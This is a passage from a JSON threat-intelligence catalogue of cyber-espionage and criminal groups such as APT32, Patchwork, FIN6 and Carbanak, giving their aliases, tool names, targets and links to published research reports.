"attck_id": null, "names": ["HEXANE", "LYCEUM"], "links": ["https://dragos.com/resource/hexane/", "https://www.secureworks.com/blog/lyceum-takes-center-stage-in-middle-east-campaign"], "tools": ["DanBot", "DanDrop", "Invoke-Obfuscation", "PowerShell", "PoshC2"], "targets": "Middle East, Kuwait, South Africa", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Papa Bear", "APT-C-37"], "links": ["https://cybersecurity.att.com/blogs/labs-research/alien-labs-2019-analysis-of-threat-groups-molerats-and-apt-c-37", "https://zhuanlan.kanxue.com/article-8168.htm", "http://blogs.360.cn/post/analysis-of-apt-c-37.html", "https://mp.weixin.qq.com/s/lUtXwWjPVMHXfR6oLnXYhQ"], "tools": [], "targets": null, "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["ZooPark", "Saber Lion", "APT-C-38"], "links": ["http://blogs.360.cn/post/analysis-of-APT-C-38.html"], "tools": [], "targets": null, "description": null}]}}, {"other": {"actors": [{"operations": [], "comment": null, "attck_id": null, "names": ["Corsair Jackal"], "links": ["https://www.crowdstrike.com/blog/regional-conflict-and-cyber-blowback/"], "tools": [], "targets": "Tunesia", "description": null}, {"operations": [], "comment": "Spanish Speaking Country", "attck_id": null, "names": ["Careto", "The Mask"], "links": ["https://securelist.com/blog/research/58254/the-caretomask-apt-frequently-asked-questions/"], "tools": [], "targets": null, "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Ragua", "Machete", "El Machete"], "links": ["https://www.cylance.com/en_us/blog/el-machete-malware-attacks-cut-through-latam.html", "https://www.welivesecurity.com/2019/08/05/sharpening-machete-cyberespionage/", "https://securelist.com/blog/research/66108/el-machete/"], "tools": [], "targets": "This threat actor targets military, government entities, and telecommunications providers, primarily in Latin America, for the purpose of espionage.", "description": null}, {"operations": ["Hangover", "Monsoon"], "comment": "Overlaps with BITTER (group)", "attck_id": null, "names": ["Capricorn Organisation ", "Chinastrats", "Dropping Elephant", "Viceroy Tiger", "APT-C-09", "Patchwork"], "links": ["https://blog.trendmicro.com/trendlabs-security-intelligence/the-urpage-connection-to-bahamut-confucius-and-patchwork/", "http://www.sohu.com/a/211497788_764248", "https://ti.360.net/blog/articles/analysis-of-apt-c-09-target-china/", "https://securelist.com/the-dropping-elephant-actor/75328/", "http://blog.trendmicro.com/trendlabs-security-intelligence/untangling-the-patchwork-cyberespionage-group/", "https://www.cymmetria.com/patchwork-targeted-attack/", "https://blogs.forcepoint.com/security-labs/monsoon-analysis-apt-campaign", "http://normanshark.com/wp-content/uploads/2013/08/NS-Unveiling-an-Indian-Cyberattack-Infrastructure_FINAL_Web.pdf", "https://mp.weixin.qq.com/s/AfGrEi-ViJxHEEDtSLvQSg", "https://blog.trendmicro.com/trendlabs-security-intelligence/deciphering-confucius-cyberespionage-operations/", "https://blog.trendmicro.com/trendlabs-security-intelligence/confucius-update-new-tools-and-techniques-further-connections-with-patchwork/"], "tools": ["Unknown Logger Public", "TINYTYPHON", "BADNEWS", "AutoIt backdoor"], "targets": "global, including targets in the US, Europe, and the Middle East, many of the target countries are in the area surrounding the Indian subcontinent", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Hellsing APT"], "links": ["https://www.kaspersky.com/blog/deny-the-hellsing-apt-by-default/3851/", "https://securelist.com/the-chronicles-of-the-hellsing-apt-the-empire-strikes-back/69567/"], "tools": [], "targets": "Naikon", "description": null}, {"operations": ["Sphinx Moth"], "comment": null, "attck_id": null, "names": ["Morpho", "Jripbot", "Wild Neutron"], "links": ["https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/"], "tools": ["Jiripbot", "Hesperbot"], "targets": null, "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Sykipot "], "links": ["https://www.sans.org/reading-room/whitepapers/malicious/detailed-analysis-sykipot-smartcard-proxy-variant-33919"], "tools": [], "targets": null, "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["DeadlyKiss", "TwoForOne", "Platinum"], "links": ["https://blog.telsy.com/deadlykiss-malware/", "https://www.microsoft.com/security/blog/2017/06/07/platinum-continues-to-evolve-find-ways-to-maintain-invisibility/?source=mmpc", "https://securelist.com/platinum-is-back/91135/", "https://download.microsoft.com/download/2/2/5/225BFE3E-E1DE-4F5B-A77B-71200928D209/Platinum%20feature%20article%20-%20Targeted%20attacks%20in%20South%20and%20Southeast%20Asia%20April%202016.pdf"], "tools": ["Hotpatching techniques", "CVE-2015-2545"], "targets": "primarily targets governmental organizations, defense institutes, intelligence agencies, and telecommunication providers in South and Southeast Asia", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Danti"], "links": ["https://securelist.com/analysis/publications/74828/cve-2015-2545-overview-of-current-threats/"], "tools": [], "targets": null, "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["SVCMONDR"], "links": ["https://securelist.com/analysis/publications/74828/cve-2015-2545-overview-of-current-threats/"], "tools": [], "targets": null, "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Transparent Tribe"], "links": ["https://www.fireeye.com/blog/threat-research/2016/06/apt_group_sends_spea.html", "https://www.proofpoint.com/sites/default/files/proofpoint-operation-transparent-tribe-threat-insight-en.pdf"], "tools": [], "targets": "Government of India diplomatic and military", "description": null}, {"operations": ["Cobalt Kitty"], "comment": null, "attck_id": null, "names": ["SeaLotus ", "APT-C-00", "Ocean Lotus", "SectorF01", "APT32"], "links": ["https://community.rsa.com/community/products/netwitness/blog/2018/01/30/apt32-continues-asean-targeting", "https://ti.qianxin.com/blog/articles/english-version-of-new-approaches-utilized-by-oceanLotus-to-target-vietnamese-environmentalist/", "https://threatvector.cylance.com/en_us/home/report-oceanlotus-apt-group-leveraging-steganography.html", "https://www.welivesecurity.com/2018/03/13/oceanlotus-ships-new-backdoor/", "https://s.tencent.com/research/report/471.html", "https://www.brighttalk.com/webcast/10703/261205", "https://www.volexity.com/blog/2017/11/06/oceanlotus-blossoms-mass-digital-surveillance-and-exploitation-of-asean-nations-the-media-human-rights-and-civil-society/", "https://www.cybereason.com/labs-operation-cobalt-kitty-a-large-scale-apt-in-asia-carried-out-by-the-oceanlotus-group/", "https://www.scmagazineuk.com/ocean-lotus-groupapt-32-identified-as-vietnamese-apt-group/article/663565/", "https://www.fireeye.com/blog/threat-research/2017/05/cyber-espionage-apt32.html", "https://unit42.paloaltonetworks.com/tracking-oceanlotus-new-downloader-kerrdown/", "https://blog.cystack.net/word-based-malware-attack/", "https://threatrecon.nshc.net/2019/07/25/growth-of-sectorf01-groups-cyber-espionage-activities/", "https://blog.malwarebytes.com/threat-analysis/2019/04/funky-malware-format-found-in-ocean-lotus-sample/"], "tools": ["Unique suite & OTS", "Microsoft ActiveMime file attachments", "KerrDown", "CobaltStrike", "SOUNDBITE", "Denis"], "targets": "This threat actor targets organizations of interest to the Vietnamese government for espionage purposes. Victims have included human rights organizations, research institutes and maritime construction firms in China, and media organizations. Heavily targeting the automotive sector since 2018. ", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["BlackOasis"], "links": ["https://securelist.com/blackoasis-apt-and-new-targeted-attacks-leveraging-zero-day-exploit/82732/"], "tools": ["CVE-2015-5119 \u2013 June 2015", "CVE-2016-0984 \u2013 June 2015", "CVE-2016-4117 \u2013 May 2016", "CVE-2017-8759 \u2013 Sept 2017", "CVE-2017-11292 \u2013 Oct 2017", "FinSpy Malware"], "targets": "Russia, Iraq, Afghanistan, Nigeria, Libya, Jordan, Tunisia, Saudi Arabia, Iran, Netherlands, Bahrain, United Kingdom and Angola", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["NEODYMIUM"], "links": ["https://blogs.technet.microsoft.com/mmpc/2016/12/14/twin-zero-day-attacks-promethium-and-neodymium-target-individuals-in-europe/"], "tools": [], "targets": null, "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["PROMETHIUM"], "links": ["https://www.alienvault.com/blogs/labs-research/newly-identified-strongpity-operations", "https://citizenlab.ca/2018/03/bad-traffic-sandvines-packetlogic-devices-deploy-government-spyware-turkey-syria/", "https://threatvector.cylance.com/en_us/home/whack-a-mole-the-impact-of-threat-intelligence-on-adversaries.html", "https://blogs.technet.microsoft.com/mmpc/2016/12/14/twin-zero-day-attacks-promethium-and-neodymium-target-individuals-in-europe/", "https://www.welivesecurity.com/2017/12/08/strongpity-like-spyware-replaces-finfisher/", "https://securelist.com/on-the-strongpity-waterhole-attacks-targeting-italian-and-belgian-encryption-users/76147/"], "tools": ["StrongPity"], "targets": null, "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Andromeda Spider"], "links": ["https://www.rsaconference.com/writable/presentations/file_upload/anf-t07b-the-art-of-attribution-identifying-and-pursuing-your-cyber-adversaries_final.pdf"], "tools": [], "targets": null, "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Bamboo Spider"], "links": ["https://go.crowdstrike.com/rs/281-OBQ-266/images/Report2018GlobalThreatReport.pdf page 19"], "tools": ["Developed Panda Zeus"], "targets": null, "description": null}, {"operations": [], "comment": "Criminal", "attck_id": null, "names": ["Boson Spider"], "links": ["https://go.crowdstrike.com/rs/281-OBQ-266/images/Report_BosonSpider.pdf", "https://www.sig-switzerland.ch/wp-content/uploads/2016/03/SIGS_SOC_Forum_Sep2017_CrowdStrike_On_the_Hunt_for_Pandas_Kittens_and_Bears.pdf see slide 15"], "tools": ["CoreBot"], "targets": null, "description": null}, {"operations": [], "comment": "Criminal, linked to Cobalt", "attck_id": null, "names": ["Magecart Group 4", "Cobalt Spider"], "links": ["https://www.crowdstrike.com/blog/meet-crowdstrikes-adversary-of-the-month-for-september-cobalt-spider/", "https://blog.malwarebytes.com/threat-analysis/2019/10/magecart-group-4:-a-link-with-cobalt-group/", "https://go.crowdstrike.com/rs/281-OBQ-266/images/Report2018GlobalThreatReport.pdf"], "tools": [], "targets": "Point of Sale", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Dextorous Spider"], "links": ["https://www.rsaconference.com/writable/presentations/file_upload/anf-t07b-the-art-of-attribution-identifying-and-pursuing-your-cyber-adversaries_final.pdf"], "tools": [], "targets": "Retail", "description": null}, {"operations": [], "comment": "Criminal", "attck_id": null, "names": ["Dundeon Spider"], "links": ["https://www.crowdstrike.com/blog/meet-crowdstrikes-adversary-of-the-month-for-october-dungeon-spider/", "https://go.crowdstrike.com/rs/281-OBQ-266/images/Report2018GlobalThreatReport.pdf "], "tools": [], "targets": null, "description": null}, {"operations": ["Onslow, North Carolina water", "Dataresolution.net (MSP for multiple US newpapers)"], "comment": "Criminal / Currently refers to Ryuk deployments following TrckBot infections", "attck_id": null, "names": ["TEMP.MixMaster", "Grim Spider"], "links": ["https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/ryuk-exploring-the-human-connection/", "https://www.onwasa.com/DocumentCenter/View/3701/Scan-from-2018-10-15-08_08_13-A", "https://blog.kryptoslogic.com/malware/2019/01/10/dprk-emotet.html", "https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/ryuk-ransomware-attack-rush-to-attribution-misses-the-point/", "https://www.fireeye.com/blog/threat-research/2019/01/a-nasty-trick-from-credential-theft-malware-to-business-disruption.html", "https://research.checkpoint.com/ryuk-ransomware-targeted-campaign-break/", "https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/", "https://krebsonsecurity.com/2019/01/cloud-hosting-provider-dataresolution-net-battling-christmas-eve-ransomware-attack/"], "tools": ["Ryuk"], "targets": null, "description": null}, {"operations": [], "comment": "Criminal", "attck_id": null, "names": ["Hound Spider"], "links": ["https://www.sig-switzerland.ch/wp-content/uploads/2016/03/SIGS_SOC_Forum_Sep2017_CrowdStrike_On_the_Hunt_for_Pandas_Kittens_and_Bears.pdf see slide 15"], "tools": [], "targets": null, "description": null}, {"operations": [], "comment": "Criminal", "attck_id": null, "names": ["SectorJ04", "TA505", "Indrik Spider"], "links": ["https://blog.yoroi.company/research/the-stealthy-email-stealer-in-the-ta505-arsenal/", "https://blog.cyberint.com/threat-group-ta505-phishing-hijacks-remote-access-tools", "https://e.cyberint.com/hubfs/CyberInt_Cybercriminals%20go%20after%20USA%20retailers_Report.pdf", "https://www.proofpoint.com/us/threat-insight/post/ta505-abusing-settingcontent-ms-within-pdf-files-distribute-flawedammyy-rat", "https://www.proofpoint.com/us/threat-insight/post/ta505-shifts-times", "https://www.proofpoint.com/us/threat-insight/post/threat-actor-profile-ta505-dridex-globeimposter", "https://www.proofpoint.com/us/threat-insight/post/servhelper-and-flawedgrace-new-malware-introduced-ta505", "https://www.crowdstrike.com/blog/big-game-hunting-the-evolution-of-indrik-spider-from-dridex-wire-fraud-to-bitpaymer-targeted-ransomware/", "https://ti.360.net/blog/articles/excel-4.0-macro-utilized-by-ta505-to-target-financial-institutions-recently-en/", "https://www.sig-switzerland.ch/wp-content/uploads/2016/03/SIGS_SOC_Forum_Sep2017_CrowdStrike_On_the_Hunt_for_Pandas_Kittens_and_Bears.pdf see slide 15", "https://www.proofpoint.com/us/threat-insight/post/ta505-targets-us-retail-industry-personalized-attachments", "https://seguranca-informatica.pt/flawedammyy-leveraging-undetected-xlm-macros-as-an-infection-vehicle/", "https://blog.yoroi.company/research/ta505-is-expanding-its-operations/", "https://blog.trendmicro.com/trendlabs-security-intelligence/shifting-tactics-breaking-down-ta505-groups-use-of-html-rats-and-other-techniques-in-latest-campaigns/", "https://www.proofpoint.com/us/threat-insight/post/ta505-begins-summer-campaigns-new-pet-malware-downloader-andromut-uae-south", "https://www.cybereason.com/blog/threat-actor-ta505-targets-financial-enterprises-using-lolbins-and-a-new-backdoor-malware"], "tools": ["Dridex", "FlawedAmmyy", "Remote Manipulator System"], "targets": "Financial institutions, Retail", "description": null}, {"operations": [], "comment": "Cooperation with Wizard Spider", "attck_id": null, "names": ["Lunar Spider"], "links": ["https://www.crowdstrike.com/blog/bokbots-man-in-the-browser-overview/", "https://www.crowdstrike.com/blog/wizard-spider-lunar-spider-shared-proxy-module/"], "tools": ["IcedID (BokBot)"], "targets": "Financial Crime", "description": null}, {"operations": [], "comment": "Russia based \"financial-crime motivated actor\" - Crowdstike 2014 Global TIR pg 57", "attck_id": null, "names": ["Magnetic Spider"], "links": ["http://go.crowdstrike.com/rs/281-OBQ-266/images/ReportGlobalThreatIntelligence.pdf"], "tools": [], "targets": "Financial Crime", "description": null}, {"operations": [], "comment": "Criminal", "attck_id": null, "names": ["Mimic Spider"], "links": ["https://www.sig-switzerland.ch/wp-content/uploads/2016/03/SIGS_SOC_Forum_Sep2017_CrowdStrike_On_the_Hunt_for_Pandas_Kittens_and_Bears.pdf see slide 15"], "tools": [], "targets": null, "description": null}, {"operations": [], "comment": "Criminal", "attck_id": null, "names": ["Monty Spider"], "links": ["https://go.crowdstrike.com/rs/281-OBQ-266/images/Report2018GlobalThreatReport.pdf page 19"], "tools": [], "targets": null, "description": null}, {"operations": [], "comment": "Criminal", "attck_id": null, "names": ["Mealybug", "TA542", "Mummy Spider"], "links": ["https://www.proofpoint.com/us/threat-insight/post/threat-actor-profile-ta542-banker-malware-distribution-service", "https://www.crowdstrike.com/blog/meet-crowdstrikes-adversary-of-the-month-for-february-mummy-spider/", "https://crowdstrike.lookbookhq.com/web-global-threat-report-2019/crowdstrike-2019-gtr", "https://go.crowdstrike.com/rs/281-OBQ-266/images/Report2018GlobalThreatReport.pdf "], "tools": ["Emotet "], "targets": null, "description": null}, {"operations": [], "comment": "Criminal / Data Extortion", "attck_id": null, "names": ["Overlord Spider"], "links": ["https://go.crowdstrike.com/rs/281-OBQ-266/images/Report2018GlobalThreatReport.pdf page 7"], "tools": [], "targets": "Entertainment and healthcare sector", "description": null}, {"operations": [], "comment": "Criminal", "attck_id": null, "names": ["Pinchy Spider"], "links": ["https://www.crowdstrike.com/blog/pinchy-spider-adopts-big-game-hunting/"], "tools": ["GandCrab"], "targets": null, "description": null}, {"operations": [], "comment": "Criminal", "attck_id": null, "names": ["Pizzo Spider"], "links": ["https://www.sig-switzerland.ch/wp-content/uploads/2016/03/SIGS_SOC_Forum_Sep2017_CrowdStrike_On_the_Hunt_for_Pandas_Kittens_and_Bears.pdf see slide 15"], "tools": [], "targets": null, "description": null}, {"operations": [], "comment": "Criminal", "attck_id": null, "names": ["Shark Spider"], "links": ["https://www.sig-switzerland.ch/wp-content/uploads/2016/03/SIGS_SOC_Forum_Sep2017_CrowdStrike_On_the_Hunt_for_Pandas_Kittens_and_Bears.pdf see slide 15"], "tools": [], "targets": null, "description": null}, {"operations": [], "comment": "Criminal", "attck_id": null, "names": ["Singing Spider"], "links": ["https://www.rsaconference.com/writable/presentations/file_upload/anf-t07b-the-art-of-attribution-identifying-and-pursuing-your-cyber-adversaries_final.pdf"], "tools": [], "targets": "Commercial, Fiancial", "description": null}, {"operations": [], "comment": "Criminal", "attck_id": null, "names": ["Magecart Group 6", "ITG08", "FIN6", "Skeleton Spider"], "links": ["https://www.proofpoint.com/us/search/site?search_text=TA530&language=en", "https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html", "https://webcache.googleusercontent.com/search?q=cache:wMkxJorBEKIJ:https://securityintelligence.com/x-force-iris-identifies-fin6-activity-on-pos-networks/+&cd=1&hl=en&ct=clnk&gl=uk&client=firefox-b", "https://exchange.xforce.ibmcloud.com/collection/FIN6-Financial-Crime-Actor-f55930eb9f4438efe9101a618d6a8703", "https://www.fireeye.com/blog/threat-research/2016/04/follow_the_money.html", "https://www2.fireeye.com/rs/848-DID-242/images/rpt-fin6.pdf", "https://go.crowdstrike.com/rs/281-OBQ-266/images/Report2018GlobalThreatReport.pdf ", "https://securityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-again/", "https://blog.trendmicro.com/trendlabs-security-intelligence/fin6-compromised-e-commerce-platform-via-magecart-to-inject-credit-card-skimmers-into-thousands-of-online-shops/"], "tools": ["FrameworkPoS", "Vawtrak/Neverquest", "Ransomware"], "targets": null, "description": null}, {"operations": [], "comment": "Criminal", "attck_id": null, "names": ["Static Spider"], "links": ["https://www.sig-switzerland.ch/wp-content/uploads/2016/03/SIGS_SOC_Forum_Sep2017_CrowdStrike_On_the_Hunt_for_Pandas_Kittens_and_Bears.pdf see slide 15"], "tools": [], "targets": null, "description": null}, {"operations": [], "comment": "Criminal", "attck_id": null, "names": ["Union Spider"], "links": ["https://www.rsaconference.com/writable/presentations/file_upload/anf-t07b-the-art-of-attribution-identifying-and-pursuing-your-cyber-adversaries_final.pdf"], "tools": [], "targets": "Manufacturing", "description": null}, {"operations": [], "comment": "Criminal", "attck_id": null, "names": ["Wicked Spider"], "links": ["https://www.crowdstrike.com/blog/meet-crowdstrikes-adversary-of-the-month-for-july-wicked-spider/", "https://www.sig-switzerland.ch/wp-content/uploads/2016/03/SIGS_SOC_Forum_Sep2017_CrowdStrike_On_the_Hunt_for_Pandas_Kittens_and_Bears.pdf see slide 15"], "tools": [], "targets": null, "description": null}, {"operations": [], "comment": "Criminal", "attck_id": null, "names": ["Wizard Spider"], "links": ["https://www.crowdstrike.com/blog/wizard-spider-adds-new-feature-to-ryuk-ransomware/", "https://crowdstrike.lookbookhq.com/web-global-threat-report-2019/crowdstrike-2019-gtr page 52", "https://www.crowdstrike.com/blog/wizard-spider-lunar-spider-shared-proxy-module/", "https://go.crowdstrike.com/rs/281-OBQ-266/images/Report2018GlobalThreatReport.pdf page 19"], "tools": ["TrickBot"], "targets": null, "description": null}, {"operations": [], "comment": "Criminal", "attck_id": null, "names": ["Wold Spider"], "links": ["https://www.sig-switzerland.ch/wp-content/uploads/2016/03/SIGS_SOC_Forum_Sep2017_CrowdStrike_On_the_Hunt_for_Pandas_Kittens_and_Bears.pdf see slide 15"], "tools": [], "targets": null, "description": null}, {"operations": [], "comment": "Criminal", "attck_id": null, "names": ["Kelihos", "Pytor Levashov ", "Zombie Spider"], "links": ["https://www.crowdstrike.com/blog/inside-the-takedown-of-zombie-spider-and-the-kelihos-botnet/", "https://www.sig-switzerland.ch/wp-content/uploads/2016/03/SIGS_SOC_Forum_Sep2017_CrowdStrike_On_the_Hunt_for_Pandas_Kittens_and_Bears.pdf see slide 15; https://go.crowdstrike.com/rs/281-OBQ-266/images/Report2018GlobalThreatReport.pdf page 18"], "tools": [], "targets": null, "description": null}, {"operations": [], "comment": "Activist", "attck_id": null, "names": ["Curious Jackal"], "links": ["https://www.sig-switzerland.ch/wp-content/uploads/2016/03/SIGS_SOC_Forum_Sep2017_CrowdStrike_On_the_Hunt_for_Pandas_Kittens_and_Bears.pdf see slide 15"], "tools": [], "targets": null, "description": null}, {"operations": [], "comment": "Activist", "attck_id": null, "names": ["Extreme Jackal"], "links": ["https://www.sig-switzerland.ch/wp-content/uploads/2016/03/SIGS_SOC_Forum_Sep2017_CrowdStrike_On_the_Hunt_for_Pandas_Kittens_and_Bears.pdf see slide 15"], "tools": [], "targets": null, "description": null}, {"operations": [], "comment": "Activist", "attck_id": null, "names": ["Gekko Jackal"], "links": ["https://www.sig-switzerland.ch/wp-content/uploads/2016/03/SIGS_SOC_Forum_Sep2017_CrowdStrike_On_the_Hunt_for_Pandas_Kittens_and_Bears.pdf see slide 15"], "tools": [], "targets": null, "description": null}, {"operations": [], "comment": "Activist", "attck_id": null, "names": ["Shifty Jackal"], "links": ["https://www.sig-switzerland.ch/wp-content/uploads/2016/03/SIGS_SOC_Forum_Sep2017_CrowdStrike_On_the_Hunt_for_Pandas_Kittens_and_Bears.pdf see slide 15"], "tools": [], "targets": null, "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Mythic\u00a0Leopard"], "links": ["https://www.crowdstrike.com/blog/adversary-of-the-month-for-may/"], "tools": [], "targets": null, "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["GravityRAT"], "links": ["https://www.cyberscoop.com/gravityrat-cisco-talos-india-pakistan/", "https://blog.talosintelligence.com/2018/04/gravityrat-two-year-evolution-of-apt.html"], "tools": [], "targets": "India", "description": null}, {"operations": [], "comment": "Criminal", "attck_id": null, "names": ["SilverTerrier"], "links": ["https://www.paloaltonetworks.com/resources/whitepapers/unit42-silverterrier-rise-of-nigerian-business-email-compromise.html"], "tools": ["Predator Pain", "Pony", "KeyBase", "ISpySoftware", "ISR Stealer", "Agent Tesla", "LokiBot", "Zeus and Atmos", "NetWire", "DarkComet and NanoCore"], "targets": null, "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["InvisiMole"], "links": ["https://www.welivesecurity.com/2018/06/07/invisimole-equipped-spyware-undercover/"], "tools": [], "targets": "Russia, Ukraine", "description": null}, {"operations": [], "comment": "Origins believed to be traced back to 2012", "attck_id": null, "names": ["T-APT-04", "SideWinder \"Rattlesnake\""], "links": ["https://blog.trendmicro.com/trendlabs-security-intelligence/first-active-attack-exploiting-cve-2019-2215-found-on-google-play-linked-to-sidewinder-apt-group/ ", "https://medium.com/@Sebdraven/apt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c", "https://www.anomali.com/blog/analyzing-digital-quartermasters-in-asia-do-chinese-and-indian-apts-have-a-shared-supply-chain", "https://s.tencent.com/research/report/479.html"], "tools": [], "targets": "Military, Govenment, Pakistan, \"South Asian countries\"", "description": null}, {"operations": [], "comment": "Dates back to 2008", "attck_id": null, "names": ["Comnie", "Topgear", "Blackgear"], "links": ["https://blog.trendmicro.com/trendlabs-security-intelligence/blackgear-cyberespionage-campaign-resurfaces-abuses-social-media-for-cc-communication/", "https://www.crowdstrike.com/resources/reports/2019-crowdstrike-global-threat-report/", "http://blog.trendmicro.com/trendlabs-security-intelligence/blackgear-espionage-campaign-evolves-adds-japan-target-list/"], "tools": ["Protux", "Eliriks"], "targets": "Japan, Taiwan, South Korea", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Aggah", "Subaat", "Gorgon Group"], "links": ["https://blog.prevailion.com/2020/02/the-triune-threat-mastermana-returns.html", "https://medium.com/@paul.k.burbage/aggah-not-exactly-apt-5e51aaff95f5", "https://blog.360totalsecurity.com/en/fishing-activities-in-kenya-and-india-by-suspected-gorgon-hacking-organization/", "https://blog.prevailion.com/2019/10/mastermana-botnet.html", "https://unit42.paloaltonetworks.com/aggah-campaign-bit-ly-blogspot-and-pastebin-used-for-c2-in-large-scale-campaign/", "https://blog.yoroi.company/research/the-evolution-of-aggah-from-roma225-to-the-rg-campaign/", "https://researchcenter.paloaltonetworks.com/2018/08/unit42-gorgon-group-slithering-nation-state-cybercrime/"], "tools": ["NanoCoreRAT", "QuasarRAT", "NJRAT", "RevengeRat"], "targets": null, "description": null}, {"operations": ["Lucky Elephant"], "comment": "Possible links to Hangover", "attck_id": null, "names": ["SectorE02", "APTC35", "APT-C-35", "Donot Team"], "links": ["http://blog.ptsecurity.com/2019/11/studying-donot-team.html", "https://github.com/aptnotes/data/files/679036/Snake.In.The.Grass.-.Python-based.Malware.Used.For.Targeted.Attacks.-.BLUE.COAT.LABS.pdf", "https://ti.360.net/blog/articles/donot-group-is-targeting-pakistani-businessman-working-in-china/", "https://asert.arbornetworks.com/donot-team-leverages-new-modular-malware-framework-south-asia/", "https://ti.360.net/blog/articles/latest-activity-of-apt-c-35/", "https://www.reuters.com/article/us-india-cyber-threat/exclusive-india-and-pakistan-hit-by-spy-malware-cybersecurity-firm-idUSKCN1B80Y2", "https://labs.bitdefender.com/wp-content/uploads/downloads/ehdevel-the-story-of-a-continuously-improving-advanced-threat-creation-toolkit/", "https://ti.360.net/blog/articles/pakistan-targeted-apt-campaign/", "https://www.netscout.com/blog/asert/lucky-elephant-campaign-masquerading", "https://threatrecon.nshc.net/2019/08/02/sectore02-updates-yty-framework-in-new-targeted-campaign-against-pakistan-government/"], "tools": ["EHDevel", "yty"], "targets": "Government officials, Pakistan, Kashmir", "description": null}, {"operations": [], "comment": "Russian-speaking", "attck_id": null, "names": ["DustSquad", "Nomadic Octopus"], "links": ["https://securelist.com/octopus-infested-seas-of-central-asia/88200/"], "tools": [], "targets": "Central Asian users and diplomatic entities", "description": null}, {"operations": ["Odinaff"], "comment": "Overlaps with FIN7", "attck_id": null, "names": ["Carbon Spider", "Carbanak Group", "Carbanak", "Anunak"], "links": ["https://www.crowdstrike.com/blog/arrests-put-new-focus-on-carbon-spider-adversary-group/", "http://2014.zeronights.ru/assets/files/slides/ivanovb-zeronights.pdf", "https://www.symantec.com/connect/blogs/odinaff-new-trojan-used-high-level-financial-attacks", "https://securelist.com/files/2015/02/Carbanak_APT_eng.pdf"], "tools": ["Mimikatz", "MBR Eraser", "SoftPerfect Network Scanner", "SSHd with BackDoor", "Ammy Admin", "CVE-2012-2539 and CVE-2012-0158", "Netscan", "PsExec", "Backdoor Batel", "Bateleur JScript Backdoor", "Cobalt Strike", "Sekur", "Agent ORM", "VB Flash", "JS FLash", "Bateleur"], "targets": "Banks of Russia and payment system", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Indrik Spider", "TA505              (merged w/Indrik Spider)"], "links": [], "tools": [], "targets": null, "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["TA544"], "links": ["https://www.proofpoint.com/us/threat-insight/post/threat-actor-profile-ta544-targets-geographies-italy-japan-range-malware"], "tools": ["URLZone", "Ursnif", "Panda Banker", "Nymaim", "Chthonic", "Smoke Loader"], "targets": "Online banking, Italy, Poland, Germany, Spain, Japan", "description": null}, {"operations": [], "comment": "Criminal", "attck_id": null, "names": ["TA555"], "links": ["https://www.proofpoint.com/us/threat-insight/post/new-modular-downloaders-fingerprint-systems-part-2-advisorsbot"], "tools": ["AdvisorsBot", "PoshAdvisor", ""], "targets": "hotel employees, restaurant workers, recruiters for telecom", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["APT-C-36", "Blind Eagle"], "links": ["https://redskyalliance.org/xindustry/apt-c-36-blind-eagle-and-colombia", "https://ti.360.net/blog/articles/apt-c-36-continuous-attacks-targeting-colombian-government-institutions-and-corporations-en/"], "tools": ["Imminent RAT"], "targets": "Colombian government institutions", "description": null}, {"operations": [], "comment": "ArtraDownloader: earliest timestamp Feb 2015", "attck_id": null, "names": ["Manling Flower (Manlinghua)", "APT-C-08", "Bitter"], "links": ["https://meltx0r.github.io/tech/2019/09/09/bitter-apt-not-so-sweet-pt2.html", "http://blogs.360.cn/post/analysis_of_APT_C_08.html", "https://www.anomali.com/blog/suspected-bitter-apt-continues-targeting-government-of-china-and-chinese-organizations#When:19:24:00Z", "https://meltx0r.github.io/tech/2019/09/06/bitter-apt-not-so-sweet.html", "https://unit42.paloaltonetworks.com/multiple-artradownloader-variants-used-by-bitter-to-target-pakistan/", "https://cert.360.cn/report/detail?id=137867e159331b7a968aa45050502d13", "https://ti.360.net/blog/articles/analysis-of-targeted-attack-against-pakistan-by-exploiting-inpage-vulnerability-and-related-apt-groups-english/"], "tools": ["BitterRAT", "ArtraDownloader", "SlideRAT"], "targets": "Pakistan, Saudi Arabia, PRC", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Bahamut"], "links": ["https://blog.talosintelligence.com/2018/07/Mobile-Malware-Campaign-uses-Malicious-MDM.html", "https://blog.talosintelligence.com/2018/07/Mobile-Malware-Campaign-uses-Malicious-MDM-Part2.html", "https://www.bellingcat.com/resources/case-studies/2017/10/27/bahamut-revisited-cyber-espionage-middle-east-south-asia/", "https://blog.trendmicro.com/trendlabs-security-intelligence/the-urpage-connection-to-bahamut-confucius-and-patchwork/", "https://www.bellingcat.com/news/mena/2017/06/12/bahamut-pursuing-cyber-espionage-actor-middle-east/"], "tools": [], "targets": "Middle Eastern human rights activists", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["WindShift"], "links": 